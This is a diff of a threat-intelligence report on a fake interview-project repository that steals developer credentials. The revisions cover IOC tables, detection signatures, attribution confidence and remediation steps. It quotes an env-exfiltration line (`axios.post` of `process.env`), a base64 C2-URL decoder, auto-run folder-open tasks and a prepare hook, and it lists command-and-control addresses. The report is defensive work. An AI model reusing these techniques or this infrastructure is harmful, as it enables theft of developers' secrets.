 | `6effad9fdee81589b37c60bbbae20483200bf53bee3e3c107b1aa47d2ac4ccb3` | `package.json` (delivery, `/api/settings/package`) | Matches [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) - reused across all three delivery domains |
 | `28e73ce85db813ba0839ee077428eaa121037e3a1ec8a13b1171e68cc2a0accd` | `server/routes/api/auth.js` | Primary malware file - `validateApiKey()` fires at module load |
 | `cc9e443872d99b07e4bf5f6baa6144fbe0fd24bc610e58340d9b8c755df17fce` | `server/controllers/auth.js` | Exports `setApiKey` (atob wrapper) and `verify` (exfil POST) |
 | `a9d8ea7c9a396d5c1f04d998f4f3e944c67ec4c88524a05c613bcb1ca0a7eacf` | `server/routes/index.js` | Clean route registration; `require('./api/auth')` triggers module-load execution |
 | `a9db9559a1e97762d0e72715301329bc325d08e239a29e1382e99033ede986de` | `server/server.js` | Clean launcher; calls `loadEnv()` and `configureRoutes()` |
 | `c08356a5a4ebbd8804c9acbe2e0c1b986d867b057d2e827ae663e4aec2204ed2` | `server/config/loadEnv.js` | Clean dotenv wrapper; merges `.env` and `.env.local` into `process.env` |
-| `0700489f04fa6aebde239bf8cf8563706544802d016386edc6c3ad229d0781fd` | `env-setup.js` (Path 1 delivery, GET `/api/settings/env`) | Beacon payload dropped to `$HOME/.vscode/` by Path 1 bootstrap; functionally identical to Path 2 delivery; whitespace variance only |
-| `da587eb8da90bc8f5203867d193933342048009f5452bf1d402346f503c573c7` | `env.npl` (Path 2 delivery, POST response from Vercel C2) | Beacon payload delivered in-memory via `new Function()`; functionally identical to Path 1 delivery; whitespace variance only |
+| `0700489f04fa6aebde239bf8cf8563706544802d016386edc6c3ad229d0781fd` | `env-setup.js` (Path 1 delivery, GET `/api/settings/env`) | Beacon payload dropped to `$HOME/.vscode/` by Path 1 bootstrap; normalized text comparison with Path 2 payload ratio `1.0` |
+| `da587eb8da90bc8f5203867d193933342048009f5452bf1d402346f503c573c7` | `env.npl` (Path 2 delivery, POST response from Vercel C2) | Beacon payload delivered in-memory via `new Function()`; same marker set and normalized text as Path 1 payload |
 
 ### Repository and Identity Indicators
 
 | Indicator | Type | Notes |
 |---|---|---|
-| `github.com/Intraverse-Dev-Tech-Hub/Dravion-Core` | Repository | Primary lure repository |
+| `github[.]com/Intraverse-Dev-Tech-Hub/Dravion-Core` | Repository | Primary lure repository |
 | `Intraverse-Dev-Tech-Hub` | GitHub Organisation | Operator persona for this campaign |
+| `359722e947eb9a7e8fe36d5da9f995df1b98f329` | Commit | Preserved repository HEAD; `.env edited online with Bitbucket` |
 | `brajanjake@gmail.com` | Email | Operator contact - `brajan` prefix matches `brajan.intro@gmail.com` ([TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) confirmed Git author) |
 | `JD-Luckykat` | Lure filename | `Luckykat` substring references `LuckyKat1001` operator account ([TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/)) |
 | `thomas.cryptolover@gmail.com` | Email | Commit-linked persona used by `Intraverse-Dev-Tech-Hub` during late-stage edits to `.env`, `.vscode/tasks.json`, and related files |
@@ -456,7 +473,7 @@ The hostname appears human-structured rather than randomly generated. The `2-27`
 | `lovelysong0209+2@gmail.com` | Email | Commit-linked persona tied to the earlier development phase under `okada0209` |
 | `167746537+DeAngDai354@users.noreply.github.com` | GitHub noreply email | Initial commit identity (`Ivan`) recorded in repository history |
 | `DeAngDai354` | Username | GitHub handle embedded in the initial commit noreply address |
-| `calendly.com/brajanjake/45min` | URL | Scheduling link used to arrange the follow-on call |
+| `calendly[.]com/brajanjake/45min` | URL | Scheduling link used to arrange the follow-on call |
 | `JD-Luckykat.pdf` | PDF lure document | Project overview / job description document used in the pretext |
 
 ### Code Pattern Indicators
@@ -466,7 +483,7 @@ The hostname appears human-structured rather than randomly generated. The `2-27`
 | Two `runOn: folderOpen` tasks in `.vscode/tasks.json` | Dual auto-execution on folder open; both fire in parallel |
 | `env` task with `close: true` | Terminal closes immediately - no visible trace of Path 1 execution |
 | `"prepare": "node server/server.js"` | npm lifecycle hook infection trigger |
-| ~200-char whitespace before command string in `tasks.json` | URL pushed off-screen; evasion of casual file inspection |
+| Raw-line whitespace padding before platform command entries in `tasks.json` | URL pushed off-screen in raw-file view; parsed command values have no leading whitespace |
 | `validateApiKey()` called at module load in `routes/api/auth.js` | Fires before any HTTP request or visible output |
 | `const setApiKey = (s) => atob(s)` | Base64 C2 URL decode - present in [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) |
 | `axios.post(api, { ...process.env }, { headers: { "x-app-request": "ip-check" } })` | Full env exfiltration with campaign fingerprint header |
@@ -484,8 +501,8 @@ The hostname appears human-structured rather than randomly generated. The `2-27`
 Network:  dst_ip=88.99.241[.]111 dst_port=1224
 Network:  http_header "x-app-request: ip-check"
 Network:  http_post to *.vercel.app/api with large JSON body containing env var keys
-Network:  dns_query ip-address-vscode-checking.vercel.app
-Network:  dns_query 2-27-bk-9-boss-api-copy-three.vercel.app
+Network:  dns_query ip-address-vscode-checking[.]vercel[.]app
+Network:  dns_query 2-27-bk-9-boss-api-copy-three[.]vercel[.]app
 File:     *.npl executed by node.exe
 File:     routes/api/auth.js containing validateApiKey() with new Function() delivery
 File:     controllers/auth.js containing setApiKey + verify exports
@@ -500,9 +517,9 @@ Env:      AUTH_API key containing base64-encoded URL in .env
 
 ## Attribution Assessment
 
-**Assessed confidence: Medium**
+**Assessed confidence: Medium for campaign-cluster relatedness; low-to-medium for DPRK-linked attribution**
 
-Cross-campaign artifact continuity now spans four reports across approximately eight weeks. The operator rotated the lure identity and Vercel delivery domains between campaigns while reusing the malware toolkit without modification. Attribution confidence is upgraded from low-to-medium to **medium** on the basis of this cross-campaign artifact chain — a stronger basis than TTP similarity alone.
+Cross-campaign artifact continuity now spans four reports across approximately eight weeks. The operator rotated the lure identity and Vercel delivery domains between campaigns while reusing the malware toolkit without modification. Confidence is **medium** that this report belongs to the same campaign cluster documented in earlier ThreatProphet cases, because the assessment rests on repeated file hashes, route patterns, headers, and execution primitives rather than TTP similarity alone. Confidence that the activity is DPRK-linked remains **low-to-medium** unless supported by external telemetry beyond this investigation.
 
 | Indicator | Evidence |
 |---|---|
@@ -520,7 +537,7 @@ Cross-campaign artifact continuity now spans four reports across approximately e
 
 Cross-campaign artifact continuity provides the strongest attribution signal in this report. The `.env.local` hash match across three campaigns indicates a shared tooling base. The `package.json` match to Softstack-Platform-MVP2 and the `brajan` handle overlap support campaign relatedness and closely aligned tradecraft, though they do not independently establish a single operator.
 
-The strongest attribution anchor is `lovelysong0209+2@gmail.com`. This development persona (`okada0209 / lovelysong0209+2@gmail.com`) is listed in the [GitLab Threat Intelligence report on North Korean tradecraft (2026-02-19)](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/) as a confirmed DPRK malware distribution account. This external corroboration upgrades confidence to **Medium** and establishes this persona as a persistent tracking indicator across the campaign series.
+The strongest external corroboration involves the `lovelysong0209` identity pattern. GitLab's February 2026 threat-intelligence reporting lists `lovelysong0209@gmail.com` among North Korean malware-distribution account data. The `lovelysong0209+2@gmail.com` plus-address variant observed in this repository is therefore analytically important, but should be treated as a related persona-pattern indicator rather than a direct one-to-one confirmation of the exact same account.
 
 TTP similarity and file-level artifact matches do not constitute confirmed attribution. Attribution should not be asserted beyond low-to-medium confidence without additional corroborating intelligence.
 
@@ -535,11 +552,16 @@ TTP similarity and file-level artifact matches do not constitute confirmed attri
 
 ---
 
+
+## Evidence Availability
+
+The underlying evidence archive is not distributed with this public report. Public comparison material is limited to hashes, commit identifiers, observed infrastructure, captured behavior, and code-pattern descriptions. Researchers with matching samples can compare the file hashes and repeated behavioral markers in the IOC section without requiring access to the private evidence set.
+
 ## Remediation
 
 ### If You Ran the Repository
 
-Treat this as a confirmed credential compromise regardless of how the repository was used. Opening the folder in VS Code fires both `tasks.json` tasks simultaneously: the `env` pipe-to-shell task (Path 1) installs a persistent beacon in `$HOME/.vscode/`, and the `install-root-modules` task silently runs `npm install`, initiating the Path 2 chain that exfiltrates `process.env` before any output is visible. Running any npm command outside VS Code fires Path 2 identically. Either path alone is sufficient for full compromise.
+Treat this as a confirmed credential compromise regardless of how the repository was used. Opening the folder in a trusted VS Code workspace where automatic tasks are allowed can fire both `tasks.json` tasks: the `env` pipe-to-shell task (Path 1) installs a beacon in `$HOME/.vscode/`, and the `install-root-modules` task runs `npm install`, initiating the Path 2 chain that exfiltrates `process.env` before normal project output is visible. Outside VS Code, `npm install` triggers the `prepare` hook and the defined `start`, `build`, `test`, and `eject` scripts route through `server/server.js`. Either path alone is sufficient for compromise.
 
 - Isolate the affected machine from the network immediately.
 - Preserve forensic evidence before remediation: memory dump, process list, shell history, `$HOME/.vscode/` contents.
@@ -555,12 +577,12 @@ Treat this as a confirmed credential compromise regardless of how the repository
 - Block and alert on all outbound connections to `88.99.241[.]111`, all ports, especially TCP/1224.
 - Create IDS/IPS rules for plain HTTP outbound from Node.js processes to non-standard high ports.
 - Monitor for outbound POST requests to `*.vercel.app/api` carrying `x-app-request: ip-check` from Node.js processes.
-- Flag DNS queries to `ip-address-vscode-checking.vercel.app` and `2-27-bk-9-boss-api-copy-three.vercel.app` from developer workstations.
+- Flag DNS queries to `ip-address-vscode-checking[.]vercel[.]app` and `2-27-bk-9-boss-api-copy-three[.]vercel[.]app` from developer workstations.
 - Alert on Node.js processes executing `.npl` files.
 
 ### Host-Level Hardening
 
-- Set `task.allowAutomaticTasks` to `off` or `prompt` in VS Code user settings. This prevents both `runOn: folderOpen` tasks from firing silently, breaking Path 1 entirely and stopping the automatic trigger of Path 2. Note that Path 2 still fires if the victim subsequently runs any npm command.
+- Set `task.allowAutomaticTasks` to `off` or `prompt` in VS Code user settings. This prevents `runOn: folderOpen` tasks from firing automatically, breaking Path 1 and stopping the automatic VS Code trigger of Path 2. Path 2 can still fire if the victim later runs `npm install` or one of the defined project scripts.
 - Audit `.vscode/tasks.json` before opening any repository from an unknown source. Look specifically for `runOn: folderOpen` and pipe-to-shell commands. Scroll horizontally in the raw file - malicious URLs may be pushed far off-screen by whitespace padding. Note that the `env` task closes its terminal immediately (`close: true`); absence of a visible terminal is not evidence that the task did not fire.
 - Audit `prepare`, `postinstall`, and `preinstall` scripts in `package.json` before running any npm commands in unfamiliar projects.
 - When evaluating repositories from unknown parties - including technical interview assessments - run them in an isolated VM or container with no access to host credentials, no mounted `.env` files containing real secrets, and filtered outbound network egress.
@@ -568,6 +590,6 @@ Treat this as a confirmed credential compromise regardless of how the repository
 
 ---
 
-*TLP:CLEAR - This report may be freely shared. Attribution assessments are tentative and based on TTP similarity only. All IOCs are provided for defensive purposes.*
+*TLP:CLEAR - This report may be freely shared. Attribution assessments are cautious and distinguish campaign relatedness from actor attribution. All IOCs are provided for defensive purposes.*
 
 *Report ID: TP-2026-009 | Published: 2026-04-13 | Author: [ThreatProphet](https://threatprophet.com)*
